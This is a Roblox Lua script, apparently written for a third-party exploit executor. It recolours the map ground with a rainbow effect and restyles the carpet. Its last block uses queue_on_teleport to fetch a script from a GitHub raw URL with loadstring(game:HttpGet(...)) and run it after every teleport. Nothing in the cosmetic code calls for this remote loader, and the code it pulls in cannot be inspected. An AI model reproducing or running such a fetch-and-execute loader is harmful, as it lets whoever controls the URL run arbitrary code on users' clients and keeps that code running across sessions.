game.workspace.Map.Ground.Material = "CrackedLava"
game.workspace.Map.Carpet.Material = "Marble"
game.workspace.Map.Carpet.Color = Color3.new(0,0,0)
local part = game.workspace.Map.Ground -- Блок, к которому прикреплен скрипт
local runService = game:GetService("RunService")

-- Функция для создания радужного эффекта
local function rainbowColor()
    local time = tick() * 2 -- Скорость изменения цвета
    local r = math.sin(time) * 0.5 + 0.5
    local g = math.sin(time + 2) * 0.5 + 0.5
    local b = math.sin(time + 4) * 0.5 + 0.5
    
    return Color3.new(r, g, b)
end

-- Подключаемся к событию рендера
runService.Heartbeat:Connect(function()
    part.Color = rainbowColor()
end)

if queue_on_teleport then
    queue_on_teleport([[
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BloxyNikita/Script-BloxyNikita/refs/heads/main/script"))()
    ]])
end
